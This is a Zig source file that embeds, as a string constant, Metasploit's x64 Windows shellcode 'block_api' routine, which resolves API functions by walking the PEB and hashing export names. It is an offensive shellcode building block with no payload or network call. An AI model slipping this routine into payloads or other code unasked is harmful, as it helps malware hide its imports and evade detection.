// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm
pub const asm_code =
    \\api_call:
    \\  push r9                 ; Save the 4th parameter
    \\  push r8                 ; Save the 3rd parameter
    \\  push rdx                ; Save the 2nd parameter
    \\  push rcx                ; Save the 1st parameter
    \\  push rsi                ; Save RSI
    \\  xor rdx, rdx            ; Initialize rdx (rdx = 0)
    \\  mov rdx, gs:[rdx+0x60]  ; Get a pointer to PEB
    \\  mov rdx, [rdx+0x18]     ; Get a pointer to PEB->Ldr
    \\  mov rdx, [rdx+0x20]     ; Get the first module from InMemoryOrderModuleList
    \\next_mod:
    \\  mov rsi, [rdx+0x50]         ; Get a pointer to module name (unicode string)
    \\  movzx rcx, word [rdx+0x4a]  ; Set rcx to the length to rcx
    \\  xor r9, r9                  ; Clear r9 which will store the hash of the module name
    \\loop_modname:
    \\  xor rax, rax
    \\  lodsb               ; Read in the next byte of the name and store it to `al` register
    \\  cmp al, 'a'         ; Check if a module name is lowercase or not because some versions of Windows use lowercase module names
    \\  jl not_lowercase    ; If uppercase, jump to 'not_lowercase' function.
    \\  sub al, 0x20        ; If lowercase, normalize to uppercase
    \\not_lowercase:
    \\  ror r9d, 0xd                ; Rotate right our hash value (r9d = the lower 32 bits of r9)
    \\  add r9d, eax                ; Add the next byte of the name
    \\  loop loop_modname           ; Loop until we have read enough
    \\  ; We now have the module hash computed
    \\  push rdx                    ; Save the current position in the module list (InMemoryOrderModuleList) for later
    \\  push r9                     ; Save the current module hash for later
    \\  ; Proceed to iterate the EAT (export address table)
    \\  mov rdx, [rdx+0x20]         ; Get this module base address
    \\  mov eax, dword [rdx+0x3c]   ; Get PE header
    \\  add rax, rdx                ; Add the module base address
    \\  cmp word [rax+0x18], 0x020b ; Check if this module is actually a PE64 executable
    \\  jne get_next_mod_ex         ; If not, proceed to the next module
    \\  mov eax, dword [rax+0x88]   ; Get EAT's RVA
    \\  test rax, rax               ; Test if export address table is not present
    \\  jz get_next_mod_ex          ; If EAX is not present, process the next module
    \\  add rax, rdx                ; Add the module base address
    \\  push rax                    ; Save the current module's EAT
    \\  mov ecx, dword [rax+0x18]   ; Get the number of function names
    \\  mov r8d, dword [rax+0x20]   ; Get the RVA of the function names
    \\  add r8, rdx                 ; Add the module base address
    \\; Computing the module hash + function hash
    \\get_next_func:
    \\  jrcxz get_next_mod          ; When we reach the start of the EAT (we search backwards), process the next module
    \\  dec rcx                     ; Decrement the function name counter
    \\  mov esi, dword [r8+rcx*0x4] ; Get RVA of the next module name
    \\  add rsi, rdx                ; Add the module's base address
    \\  xor r9, r9                  ; Clear r9 which will store the hash of the function name
    \\; And compare it to the one we want
    \\loop_funcname:
    \\  xor rax, rax
    \\  lodsb                       ; Read in the next byte of the ASCII function name and store it to 'al' register
    \\  ror r9d, 0xd                ; Rotate right our hash value
    \\  add r9d, eax                ; Add the next byte of the name
    \\  cmp al, ah                  ; Check if the next byte of the name is null terminator by comparing al to ah (null)
    \\  jne loop_funcname           ; If we haven't reached the null terminator, continue
    \\  add r9, [rsp+0x8]           ; Add the current module hash to the function hash
    \\  cmp r9d, r10d               ; Compare the hash to the one we are searching for
    \\  jnz get_next_func           ; If we have not found, go compute the next function hash
    \\  ; If found, fix up stack, call the function and then value else compute the next one...
    \\  pop rax                     ; Restore the current module's EAT
    \\  mov r8d, dword [rax+0x24]   ; Get the original table's RVA
    \\  add r8, rdx                 ; Add the module's base address
    \\  mov cx, [r8+0x2*rcx]        ; Get the desired functions ordinal
    \\  mov r8d, dword [rax+0x1c]   ; Get the function addresses table's RVA
    \\  add r8, rdx                 ; Add the module's base address
    \\  mov eax, dword [r8+0x4*rcx] ; Get the desired function's RVA
    \\  add rax, rdx                ; Add the module's base address to get the function's actual VA
    \\  ; We now fix up the stack and perform the call to the desired function...
    \\finish_and_call:
    \\  pop r8          ; Clear off the current module's hash
    \\  pop r9          ; Clear off the current position in the module list
    \\  pop rsi         ; Restore RSI
    \\  pop rcx         ; Restore the 1st parameter
    \\  pop rdx         ; Restore the 2nd parameter
    \\  pop r8          ; Restore the 3rd parameter
    \\  pop r9          ; Restore the 4th parameter
    \\  pop r10         ; Pop off the return address
    \\  sub rsp, 0x20   ; Reserve space for the four register params (4 * sizeof(QWORD) = 0x20)
    \\  ;
    \\  push r10        ; Push back the return address
    \\  jmp rax         ; Jump into the required function
    \\  ; We now automatically return to the correct caller...
    \\get_next_mod:
    \\pop rax ; Restore the current (now the previous) module's EAT by popping off rax
    \\get_next_mod_ex:
    \\  pop r9          ; Restore the current (now the previous) module's hash by popping off r9
    \\  pop rdx         ; Restore our position in the module list by popping of rdx
    \\  mov rdx, [rdx]  ; Get the next module
    \\  jmp next_mod    ; Process this module
;
